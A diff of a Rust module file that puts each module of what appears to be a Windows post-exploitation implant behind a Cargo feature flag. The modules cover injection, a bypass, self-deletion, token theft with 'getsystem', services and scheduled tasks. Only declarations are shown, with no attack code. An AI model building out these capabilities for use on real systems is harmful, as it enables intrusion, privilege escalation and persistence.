@@ -1,28 +1,43 @@
+#[cfg(feature = "env")]
+pub mod env;
 #[cfg(debug_assertions)]
 pub mod example;
-pub mod ps;
+#[cfg(feature = "netstat")]
 pub mod netstat;
-pub mod env;
+#[cfg(feature = "ps")]
+pub mod ps;
+#[cfg(feature = "whoami")]
 pub mod whoami;
 // mod reg;
+#[cfg(feature = "kill")]
 pub mod kill;
 // mod spawn;
 #[cfg(feature = "info")]
 pub mod info;
 
-#[cfg(target_family = "windows")]
+#[cfg(all(target_family = "windows", feature = "bypass"))]
 pub mod bypass;
-#[cfg(target_family = "windows")]
-pub mod reg;
-#[cfg(target_family = "windows")]
-pub mod service;
-#[cfg(target_family = "windows")]
-pub mod taskschd;
-#[cfg(target_family = "windows")]
-#[cfg(feature = "wmi")]
-pub mod wmi;
-#[cfg(target_family = "windows")]
-pub mod token;
-#[cfg(target_family = "windows")]
+#[cfg(all(target_family = "windows", feature = "inject"))]
 pub mod inject;
-
+#[cfg(all(target_family = "windows", feature = "registry"))]
+pub mod reg;
+#[cfg(all(target_family = "windows", feature = "self_dele"))]
+pub mod self_dele;
+#[cfg(all(target_family = "windows", feature = "service"))]
+pub mod service;
+#[cfg(all(target_family = "windows", feature = "taskschd"))]
+pub mod taskschd;
+#[cfg(feature = "thread_spawn_test")]
+pub mod thread_spawn_test;
+#[cfg(all(
+    target_family = "windows",
+    any(
+        feature = "runas",
+        feature = "rev2self",
+        feature = "privs",
+        feature = "getsystem"
+    )
+))]
+pub mod token;
+#[cfg(all(target_family = "windows", feature = "wmi"))]
+pub mod wmi;
